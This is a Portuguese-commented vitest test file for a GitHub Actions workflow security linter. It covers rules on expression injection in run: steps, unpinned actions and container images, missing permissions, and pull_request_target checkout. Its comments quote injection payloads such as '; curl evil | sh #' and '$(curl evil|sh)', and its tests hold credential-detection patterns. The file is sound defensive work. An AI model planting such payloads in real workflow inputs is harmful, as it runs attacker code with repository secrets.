// ATAQUE: o CI vira o caminho mais curto para EXECUTAR código de estranho com os segredos do repositório.
//
// Um workflow de GitHub Actions roda com acesso a `GITHUB_TOKEN` e aos secrets. As formas clássicas de
// entregar isso a quem abre um PR, todas verificadas aqui pelo linter:
//
//   1. INTERPOLAÇÃO DE CONTEXTO DE TERCEIRO EM `run:` — o título/branch/corpo de um PR é texto do ATACANTE, e
//      `${{ }}` é substituído ANTES de o shell rodar. Um título `"; curl evil|sh #` é execução de comando.
//      Foi exatamente a classe do CI extinto deste repositório (story-15g6bb). O jeito certo: passar por
//      `env:` e referenciar como `"$VAR"`, onde o shell trata como DADO. Vale para os QUATRO contextos que um
//      estranho escolhe — `github.event.*`, `github.head_ref`, `github.ref_name` e `inputs.*` —, não só para
//      o primeiro: um linter que cobre menos do que promete é por que alguém confia e não confere.
//   2. CÓDIGO DE TERCEIRO POR REFERÊNCIA MUTÁVEL — `uses: org/acao@v4` resolve para o que a tag apontar HOJE.
//      Quem controla a tag (ou invade o repo da action) executa código no nosso CI. Mesma régua para
//      `container:` e `services.<nome>.image`, que rodam imagem de terceiro DENTRO do job, com os secrets
//      dele no ambiente. SHA (action) e `@sha256:` (imagem) são os únicos vínculos imutáveis.
//   3. `permissions:` AUSENTE — o default do repositório pode ser `write-all`, e aí todo job ganha poder de
//      escrever no repo e publicar pacote. Declarar o mínimo é o que limita o estrago de um job comprometido.
//   4. `pull_request_target` COM CHECKOUT DO PR — o gatilho roda com secrets E no contexto do repo base; se
//      ainda fizer checkout do código do PR, é execução direta de código não revisado com segredo na mão.
//
// ⚠️ E a regra que o teste também protege é CONDICIONAL POR ÁRVORE, porque a resposta certa muda de lado do
// corte. No UMBRELLA, `.github/workflows/` não pode existir: o dono deletou os 5 workflows de propósito
// (c5c2f0013, 461 deleções) e o CI daqui é LOCAL — recriá-los aqui reverteria uma decisão dele por efeito
// colateral. No repositório EXTRAÍDO é o contrário, e por um fato mecânico: o GitHub só executa o que está em
// `.github/workflows/`. Enquanto os workflows viviam numa cópia revisada fora dali, o repositório publicado nascia com o
// TEXTO de cinco portões e ZERO portões ligados (medido: `git ls-tree -r --name-only HEAD | grep -c
// '^\.github/'` = 0) — pior que não ter CI, porque quem adota confia na prosa que viaja junto. Quem monta é a
// montagem em `.github/` — hoje a única cópia, e é dela que o teste de produtor cobra o efeito.
import { execFileSync } from "node:child_process";
import { existsSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { afterEach, describe, expect, it } from "vitest";

const REPO_ROOT = fileURLToPath(new URL("../../../../../../", import.meta.url));
const LINTER = path.join(REPO_ROOT, "scripts/security/lint-workflows.mjs");
const ARTEFATO = path.join(REPO_ROOT, ".github");
const WORKFLOWS = path.join(ARTEFATO, "workflows");

let dirs: string[] = [];
afterEach(() => {
  for (const d of dirs) rmSync(d, { recursive: true, force: true });
  dirs = [];
});

function comWorkflow(yaml: string) {
  const dir = mkdtempSync(path.join(tmpdir(), "ah-wf-"));
  dirs.push(dir);
  writeFileSync(path.join(dir, "teste.yml"), yaml, "utf8");
  return dir;
}

function lint(dir: string) {
  try {
    const out = execFileSync(process.execPath, [LINTER, "--dir", dir, "--json"], { encoding: "utf8" });
    return { code: 0, v: JSON.parse(out) };
  } catch (e) {
    const err = e as { status?: number; stdout?: string };
    return { code: err.status ?? -1, v: err.stdout ? JSON.parse(err.stdout) : null };
  }
}

const SHA = "a1b2c3d4e5f6071829304a5b6c7d8e9f00112233";

/** Um workflow correto — a base sobre a qual cada ataque introduz UM defeito. */
function base(over = "") {
  return `name: ok
on: { pull_request: {} }
permissions:
  contents: read
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@${SHA}
      - run: echo "oi"
${over}`;
}

describe("linter de workflow — o CI do repo OSS nasce correto (story-w5ujrj)", () => {
  it("o workflow-base passa (o linter não é um `exit 1` fixo)", () => {
    expect(lint(comWorkflow(base())).code).toBe(0);
  });

  it("ATAQUE 1: `${{ github.event.* }}` dentro de `run:` é REPROVADO", () => {
    const r = lint(
      comWorkflow(
        // Sem `: ` dentro do escalar simples — um `run: echo "PR: x"` é YAML INVÁLIDO (o `: ` vira separador
        // de mapa), e o fixture cairia em `unparseable` sem nunca exercitar a regra sob teste.
        base(`      - run: echo "\${{ github.event.pull_request.title }}"
`),
      ),
    );
    expect(r.code).toBe(2);
    expect(r.v.findings[0].rule).toBe("event-interpolation-in-run");
  });

  it("ATAQUE 1b: a mesma interpolação dentro de `github-script` é REPROVADA", () => {
    // `github-script` executa JS: o texto do atacante entra no PROGRAMA, não num argumento.
    const r = lint(
      comWorkflow(
        base(`      - uses: actions/github-script@${SHA}
        with:
          script: |
            console.log("\${{ github.event.issue.body }}")
`),
      ),
    );
    expect(r.code).toBe(2);
    expect(r.v.findings.map((f: { rule: string }) => f.rule)).toContain("event-interpolation-in-script");
  });

  it("ATAQUE 1c: passar por `env:` e usar \"$VAR\" é o jeito CERTO e passa", () => {
    // A contraprova: sem ela o linter poderia estar só proibindo a palavra `github.event`, o que tornaria
    // impossível escrever o workflow legítimo — e o time desligaria o linter.
    const r = lint(
      comWorkflow(
        base(`      - env:
          TITULO: \${{ github.event.pull_request.title }}
        run: echo "$TITULO"
`),
      ),
    );
    expect(r.code).toBe(0);
  });

  it("ATAQUE 2: action por tag mutável é REPROVADA; por SHA passa", () => {
    const r = lint(
      comWorkflow(`name: x
on: { push: {} }
permissions: { contents: read }
jobs:
  b:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
`),
    );
    expect(r.code).toBe(2);
    expect(r.v.findings[0].rule).toBe("unpinned-action");
    expect(r.v.findings[0].detail).toContain("actions/checkout@v4");
  });

  it("ATAQUE 3: workflow sem `permissions:` é REPROVADO", () => {
    const r = lint(
      comWorkflow(`name: x
on: { push: {} }
jobs:
  b:
    runs-on: ubuntu-latest
    steps:
      - run: echo oi
`),
    );
    expect(r.code).toBe(2);
    expect(r.v.findings.map((f: { rule: string }) => f.rule)).toContain("missing-permissions");
  });

  it("ATAQUE 3b: `permissions: write-all` é REPROVADO", () => {
    const r = lint(
      comWorkflow(`name: x
on: { push: {} }
permissions: write-all
jobs:
  b:
    runs-on: ubuntu-latest
    steps:
      - run: echo oi
`),
    );
    expect(r.code).toBe(2);
    expect(r.v.findings.map((f: { rule: string }) => f.rule)).toContain("permissions-write-all");
  });

  it("ATAQUE 4: `pull_request_target` com checkout do ref do PR é REPROVADO", () => {
    const r = lint(
      comWorkflow(`name: x
on: { pull_request_target: {} }
permissions: { contents: read }
jobs:
  b:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@${SHA}
        with:
          ref: \${{ github.event.pull_request.head.sha }}
`),
    );
    expect(r.code).toBe(2);
    expect(r.v.findings.map((f: { rule: string }) => f.rule)).toContain("pr-target-checkout");
  });

  it("YAML inválido é REPROVA, não varredura vazia (fail-closed)", () => {
    // Um linter que não consegue parsear e devolve zero achados é pior que linter nenhum: ele afirma limpo.
    const r = lint(comWorkflow("name: [isto: não\n  fecha"));
    expect(r.code).toBe(2);
    expect(r.v.findings[0].rule).toBe("unparseable");
  });

  it("diretório SEM workflow nenhum é REPROVA (o gate não pode passar por não ter medido nada)", () => {
    const dir = mkdtempSync(path.join(tmpdir(), "ah-wf-vazio-"));
    dirs.push(dir);
    expect(lint(dir).code).toBe(2);
  });

  it("ATAQUE 1d: `${{ inputs.* }}` em `run:` é REPROVADO — o valor vem de quem DISPARA", () => {
    // `github.event.*` cobre o PR; NÃO cobre `inputs.*`. Num `workflow_dispatch` o valor é digitado por quem
    // dispara (e num `workflow_call`, escolhido pelo workflow chamador, que pode ter nascido de contexto
    // hostil). Interpolado em `run:`, um input `; curl evil | sh #` é execução de comando com os secrets do
    // job — a mesma classe do ATAQUE 1, por um contexto que o linter não olhava.
    const r = lint(
      comWorkflow(`name: x
on:
  workflow_dispatch:
    inputs:
      alvo:
        type: string
permissions: { contents: read }
jobs:
  b:
    runs-on: ubuntu-latest
    steps:
      - run: echo "\${{ inputs.alvo }}"
`),
    );
    expect(r.code, "input de workflow_dispatch em `run:` tem de REPROVAR").toBe(2);
    expect(r.v.findings.map((f: { rule: string }) => f.rule)).toContain("event-interpolation-in-run");
  });

  it("ATAQUE 1e: `${{ github.ref_name }}` em `run:` é REPROVADO — nome de ref é texto de quem cria o ref", () => {
    // `github.head_ref` já era barrado, mas o MESMO nome de branch chega por `github.ref_name` (push, e o
    // gatilho de tag). Quem abre um fork escolhe o nome do branch: `$(curl evil|sh)` é nome de branch válido.
    const r = lint(
      comWorkflow(`name: x
on: { push: {} }
permissions: { contents: read }
jobs:
  b:
    runs-on: ubuntu-latest
    steps:
      - run: echo "\${{ github.ref_name }}"
`),
    );
    expect(r.code).toBe(2);
    expect(r.v.findings.map((f: { rule: string }) => f.rule)).toContain("event-interpolation-in-run");
  });

  it("ATAQUE 1g: `${{ github.ref }}` em `run:` é REPROVADO — é o MESMO nome de ref, sem o prefixo cortado", () => {
    // A lente adversarial desta onda: a passada anterior acrescentou `github.ref_name` argumentando que é "o
    // MESMO nome de branch por outra porta" — e deixou aberta a porta ORIGINAL. `github.ref` é
    // `refs/heads/<nome>` com o nome do ref INTEIRO dentro; `ref_name` é literalmente ele sem o prefixo. Quem
    // escolhe um é quem escolhe o outro, e `$(curl evil|sh)` é nome de branch/tag válido (git recusa espaço,
    // `~`, `^`, `:`, `?`, `*`, `[` — não recusa `$`, `(`, `)`, `` ` ``, `;`, `|`). Cobrir um e não o outro é
    // uma régua que só pega quem escreveu a variante mais nova.
    const r = lint(
      comWorkflow(`name: x
on: { push: {} }
permissions: { contents: read }
jobs:
  b:
    runs-on: ubuntu-latest
    steps:
      - run: echo "\${{ github.ref }}"
`),
    );
    expect(r.code, "`github.ref` em `run:` tem de REPROVAR igual a `github.ref_name`").toBe(2);
    expect(r.v.findings.map((f: { rule: string }) => f.rule)).toContain("event-interpolation-in-run");
  });

  it("ATAQUE 1f: o mesmo `inputs.*` passado por `env:` e lido como \"$VAR\" PASSA", () => {
    // Contraprova obrigatória: se o jeito certo também reprovasse, não haveria como escrever o workflow
    // legítimo — e o time desligaria o linter, que é o pior desfecho possível.
    const r = lint(
      comWorkflow(`name: x
on: { workflow_dispatch: { inputs: { alvo: { type: string } } } }
permissions: { contents: read }
jobs:
  b:
    runs-on: ubuntu-latest
    steps:
      - env:
          ALVO: \${{ inputs.alvo }}
        run: echo "$ALVO"
`),
    );
    expect(r.code).toBe(0);
  });

  it("ATAQUE 2c: `container:` por tag mutável é REPROVADO; por digest passa", () => {
    // A régua de pinagem olhava só `uses:`. Mas `container:` executa uma imagem de TERCEIRO dentro do job,
    // com os secrets dele no ambiente — mesmo poder de uma action, e por tag mutável: quem repontar
    // `node:22` no registry passa a rodar código no nosso CI. Digest é o único vínculo imutável.
    const wf = (img: string) => `name: x
on: { push: {} }
permissions: { contents: read }
jobs:
  b:
    runs-on: ubuntu-latest
    container: ${img}
    steps:
      - run: echo oi
`;
    const r = lint(comWorkflow(wf("node:22")));
    expect(r.code, "imagem de container por tag tem de REPROVAR").toBe(2);
    expect(r.v.findings[0].rule).toBe("unpinned-image");
    expect(lint(comWorkflow(wf(`node@sha256:${"a".repeat(64)}`))).code).toBe(0);
  });

  it("ATAQUE 2d: a forma de MAPA do `container:` e cada `services.<nome>.image` também são verificadas", () => {
    // A forma de mapa é a comum de verdade (`credentials`, `options`), e `services:` é o esquecido: um
    // sidecar por tag executa dentro da rede do job igual ao container principal.
    const r = lint(
      comWorkflow(`name: x
on: { push: {} }
permissions: { contents: read }
jobs:
  b:
    runs-on: ubuntu-latest
    container:
      image: node:22
    services:
      db:
        image: postgres:16
    steps:
      - run: echo oi
`),
    );
    expect(r.code).toBe(2);
    const detalhes = r.v.findings
      .filter((f: { rule: string }) => f.rule === "unpinned-image")
      .map((f: { detail: string }) => f.detail)
      .join(" | ");
    expect(detalhes).toContain("node:22");
    expect(detalhes, "o sidecar de `services:` tem de aparecer nomeado").toContain("postgres:16");
    expect(detalhes).toContain("db");
  });

  it("a PROMESSA do cabeçalho nomeia TODA regra que o linter emite", () => {
    // O furo que este caso fecha não é de execução, é de CONFIANÇA: um cabeçalho que anuncia "as quatro
    // classes" enquanto o código verifica outra lista faz quem lê confiar sem verificar. Aqui a promessa é
    // amarrada ao código — regra nova sem descrição no cabeçalho fica vermelha no merge gate.
    const fonte = readFileSync(LINTER, "utf8");
    const emitidas = new Set([...fonte.matchAll(/achado\([^,]+,\s*"([a-z-]+)"/g)].map((m) => m[1]));
    expect(emitidas.size, "o linter deixou de emitir regras — a extração deu errado").toBeGreaterThanOrEqual(6);
    const cabecalho = fonte.slice(0, fonte.indexOf("import "));
    for (const regra of emitidas) {
      expect(cabecalho, `a regra \`${regra}\` existe no código e NÃO está descrita no cabeçalho`).toContain(regra);
    }
  });
});

/**
 * Todo caminho que os `run:` de um workflow invocam, separado em ENTRADA (tem de existir antes) e
 * SAÍDA (o próprio passo escreve). Sem parser de YAML de propósito: a regra do escalar em bloco é a
 * indentação, e é a mesma que `oss-tree.ts` usa para achar o produtor do gate de segredo.
 *
 * POR QUE ISTO EXISTE AQUI: são dois MOMENTOS diferentes da mesma
 * derivação, e o extrator não viaja. Lá a pergunta é "o artefato nasce com o CI ligado?"; aqui é "um
 * PR desta árvore acabou de deixar o CI chamando o que não existe?" — a pergunta que só o repositório
 * publicado, onde há PR de estranho, consegue fazer. A fonte das duas é o mesmo texto do workflow.
 */
function caminhosInvocados(dirWorkflows: string): { entradas: Map<string, string[]>; saidas: Set<string> } {
  const FLAG_DE_ESCRITA = /^(-o|--out|--output|--emit-[a-z-]+|--out-[a-z-]+)$/;
  const pareceCaminho = (t: string) =>
    /^[A-Za-z0-9_@.][A-Za-z0-9_@./-]*$/.test(t) && (t.includes("/") || t.startsWith("."));
  const entradas = new Map<string, string[]>();
  const saidas = new Set<string>();
  for (const f of readdirSync(dirWorkflows).filter((f) => /\.ya?ml$/.test(f))) {
    const linhas = readFileSync(path.join(dirWorkflows, f), "utf8").split("\n");
    const comandos: string[] = [];
    for (let i = 0; i < linhas.length; i++) {
      if (!/^\s*(-\s+)?run:/.test(linhas[i])) continue;
      const indent = linhas[i].search(/\S/);
      const corpo = [linhas[i].replace(/^\s*(-\s+)?run:\s*[|>][-+]?\s*/, " ").replace(/^\s*(-\s+)?run:\s*/, " ")];
      for (let j = i + 1; j < linhas.length; j++) {
        if (linhas[j].trim() === "") continue;
        if (linhas[j].search(/\S/) <= indent) break;
        corpo.push(linhas[j]);
      }
      comandos.push(corpo.join(" ").replace(/\s+/g, " ").trim());
    }
    const saidasDoArquivo = new Set<string>();
    for (const cmd of comandos) {
      const toks = cmd.split(/\s+/).map((t) => t.replace(/^["']|["']$/g, ""));
      toks.forEach((t, i) => {
        const proximo = (toks[i + 1] ?? "").replace(/^["']|["']$/g, "");
        if ([">", ">>", "1>", "2>"].includes(t) || FLAG_DE_ESCRITA.test(t)) {
          if (pareceCaminho(proximo)) saidasDoArquivo.add(proximo);
        } else if (/^>{1,2}[^>]/.test(t) && pareceCaminho(t.replace(/^>+/, ""))) {
          saidasDoArquivo.add(t.replace(/^>+/, ""));
        }
      });
    }
    for (const s of saidasDoArquivo) saidas.add(s);
    for (const cmd of comandos) {
      for (const bruto of cmd.split(/\s+/)) {
        const t = bruto.replace(/^["']|["']$/g, "");
        if (!pareceCaminho(t) || saidasDoArquivo.has(t)) continue;
        entradas.set(t, [...(entradas.get(t) ?? []), f]);
      }
    }
  }
  return { entradas, saidas };
}

const SO_NO_ARTEFATO = ".github/workflows";
describe("o CI deste repositório", () => {
  it("os workflows vivem em .github/workflows — a única cópia — e há pelo menos um", () => {
    // Até a issue #1 havia DUAS cópias (uma revisada em `oss/`, uma montada aqui) e um teste que as
    // comparava byte a byte. A cópia revisada saiu; o que o GitHub executa é o que a suíte lê.
    expect(existsSync(WORKFLOWS), ".github/workflows ausente — o GitHub não executa portão nenhum").toBe(true);
    const montados = readdirSync(WORKFLOWS).filter((f) => /\.ya?ml$/.test(f));
    expect(montados.length, "nenhum workflow em .github/workflows — o CI sumiu").toBeGreaterThan(0);
    expect(existsSync(path.join(REPO_ROOT, "oss")), "a cópia revisada em oss/ voltou — a árvore é uma só").toBe(false);
  });
  it("todo caminho que os workflows invocam existe nesta árvore", () => {
    // O defeito que este caso fecha, medido no artefato de referência: o passo
    // `node scripts/security/lint-workflows.mjs --dir .github/workflows` tinha METADE conferida — o
    // script era cobrado por um piso derivado que casa só o prefixo `scripts/`, e o DIRETÓRIO que ele
    // varre era invisível. Era justamente o que não existia.
    const { entradas } = caminhosInvocados(WORKFLOWS);
    expect(entradas.size, "o censo de caminhos veio vazio — o instrumento quebrou, não o mundo").toBeGreaterThanOrEqual(4);
    expect(
      [...entradas.keys()],
      "nenhum workflow varre `.github/workflows` — o CI deixou de se vigiar (o lint dos próprios workflows)",
    ).toContain(SO_NO_ARTEFATO);

    const ausentes = [...entradas.entries()]
      .filter(([p]) => p !== SO_NO_ARTEFATO)
      .filter(([p]) => !existsSync(path.join(REPO_ROOT, p)))
      .map(([p, onde]) => `${p} (invocado em ${[...new Set(onde)].join(", ")})`);
    expect(ausentes, "workflow chamando caminho inexistente = gate que nunca reprova, verde por não medir").toEqual([]);

  });

  it("os workflows passam o próprio linter", () => {
    expect(existsSync(WORKFLOWS), ".github/workflows ausente").toBe(true);
    const r = lint(WORKFLOWS);
    expect(r.code, `o artefato de CI reprovou o próprio linter: ${JSON.stringify(r.v?.findings)}`).toBe(0);
    expect(r.v.scanned).toBeGreaterThan(0);
  });

  it("PRODUTOR: o CI do repo OSS chama os gates que esta sessão construiu", () => {
    // Sem esta asserção, os scripts de SBOM/VEX/licença seriam capacidade DECLARADA com zero produtores —
    // o padrão que este repositório já pagou para aprender (o gate de segredo existia e nada o executava).
    const textos = readdirSync(WORKFLOWS)
      .filter((f) => /\.ya?ml$/.test(f))
      .map((f) => readFileSync(path.join(WORKFLOWS, f), "utf8"))
      .join("\n");
    for (const alvo of [
      "oss-snapshot-gate",
      "scripts/security/generate-sbom.mjs",
      "scripts/security/osv-query.mjs",
      "scripts/security/vex-gate.mjs",
      "scripts/security/check-licenses.mjs",
      "scripts/security/lint-workflows.mjs",
    ]) {
      expect(textos, `nenhum workflow do artefato invoca ${alvo}`).toContain(alvo);
    }
    expect(textos).toMatch(/typecheck|tsc --noEmit/);
    expect(textos).toMatch(/vitest|bun run test/);
    // O `next.config.js` deste pacote desliga as duas verificações DENTRO do build
    // (`eslint.ignoreDuringBuilds`, `typescript.ignoreBuildErrors`). Sem passos próprios, o CI não
    // verificava nenhuma das duas: o build passava por cima e a suíte não olha estilo nem resolução de
    // módulo. São o que o build explicitamente NÃO faz — não redundância com ele.
    expect(textos, "o CI não linta — e o build não linta por configuração").toMatch(/bun run lint|next lint/);
    expect(textos, "o CI não constrói — um commit que não builda passava verde").toMatch(
      /bun run build|next build/,
    );
  });

  it("todo `bun run <script>` que os workflows invocam existe no package.json do pacote", () => {
    // CI chamando script inexistente é passo que nunca roda: `bun run` devolve erro, mas um passo novo
    // costuma nascer com o nome errado e só o CI de verdade contaria — e ele ainda não existe (o
    // repositório publicado não foi criado). Este é o único lugar onde o erro aparece antes do push.
    const textos = readdirSync(WORKFLOWS)
      .filter((f) => /\.ya?ml$/.test(f))
      .map((f) => readFileSync(path.join(WORKFLOWS, f), "utf8"))
      .join("\n");
    const invocados = new Set([...textos.matchAll(/bun run ([a-z][a-z0-9:-]*)/g)].map((m) => m[1]));
    expect(invocados.size, "nenhum `bun run` nos workflows — o censo quebrou, não o mundo").toBeGreaterThan(0);
    const pkg = JSON.parse(readFileSync(path.join(REPO_ROOT, "packages/storymap-ui/package.json"), "utf8"));
    const scripts = Object.keys(pkg.scripts ?? {});
    for (const nome of invocados) {
      expect(scripts, `o CI chama \`bun run ${nome}\`, que não existe no package.json`).toContain(nome);
    }
  });

  it("nenhum gate do CI recorta a árvore com lista de exclusão — tudo que está aqui se publica", () => {
    // Uma lista de exclusão SUBTRAI da varredura arquivos que estão no repositório, e a subtração é INVISÍVEL: `--fail-on-unscanned` reprova o ponto
    // cego ACIDENTAL (teto de bytes, não-regular, só no índice), nunca a exclusão deliberada.
    //
    // MEDIDO em 2026-08-21, quando a régua da extração ainda era reaplicada aqui: 10 dos 1236 rastreados ficavam fora — `.github/` inteiro, o
    // `.gitignore`, os quatro documentos de raiz e o golden gerado no destino. Uma chave `AKIA…` colada
    // em `.github/workflows/` saía EXIT 0 com a régua e EXIT 2 sem ela.
    const textos = readdirSync(WORKFLOWS)
      .filter((f) => /\.ya?ml$/.test(f))
      .map((f) => readFileSync(path.join(WORKFLOWS, f), "utf8"));
    // Anti-vácuo: sem nenhum gate de segredo, a proibição abaixo passaria por não ter o que medir.
    expect(textos.join("\n"), "nenhum workflow invoca o gate de segredo").toContain("scan-snapshot-secrets.mjs");
    // SÓ o que EXECUTA: linha de comentário fora. Na primeira rodada este caso reprovou a si mesmo — o
    // comentário que explica por que a régua não é passada CITA a régua, e citar não é passar. Medir o
    // texto inteiro transformaria "documente a decisão" em infração, que é como um guarda ensina a
    // apagar a explicação em vez de corrigir o defeito.
    const executavel = (t: string) =>
      t
        .split("\n")
        .filter((l) => !/^\s*#/.test(l))
        .join("\n");
    for (const t of textos) {
      expect(executavel(t), "um gate do CI voltou a recortar a árvore com uma lista de exclusão").not.toMatch(
        /--exclude-from/,
      );
    }
    // O que NÃO pode sumir junto com ela: sem estes dois o gate deixa de ser fail-closed.
    expect(textos.join("\n")).toContain("--tracked-only");
    expect(textos.join("\n")).toContain("--fail-on-unscanned");

  });

  it("o artefato traz Dependabot e CODEOWNERS (entrada no branch, não cerimônia de deploy)", () => {
    expect(existsSync(path.join(ARTEFATO, "dependabot.yml"))).toBe(true);
    expect(existsSync(path.join(ARTEFATO, "CODEOWNERS"))).toBe(true);
    const dep = readFileSync(path.join(ARTEFATO, "dependabot.yml"), "utf8");
    // Actions pinadas por SHA só ficam ATUALIZADAS se algo as bumpar — senão a pinagem vira abandono.
    expect(dep).toContain("github-actions");
  });
});

/** Guarda de custo: o linter roda em todo merge gate, então não pode depender de rede nem de instalação. */
describe("o linter é auto-contido", () => {
  it("não faz requisição de rede nem chama gerenciador de pacotes", () => {
    const fonte = readFileSync(LINTER, "utf8");
    expect(fonte).not.toMatch(/\bfetch\(|https?:\/\/api\./);
    expect(fonte).not.toMatch(/npm install|bun add|yarn add/);
  });

  it("os arquivos do artefato não carregam bytes de credencial (o gate de snapshot já os cobre)", () => {
    // Redundância intencional e barata: o artefato de CI é justamente onde um segredo de exemplo tende a
    // ser colado "só para testar".
    const textos = readdirSync(WORKFLOWS).map((f) => readFileSync(path.join(WORKFLOWS, f), "utf8"));
    for (const t of textos) {
      expect(t).not.toMatch(/AKIA[0-9A-Z]{16}/);
      expect(t).not.toMatch(/-----BEGIN [A-Z ]*PRIVATE KEY-----/);
    }
  });
});
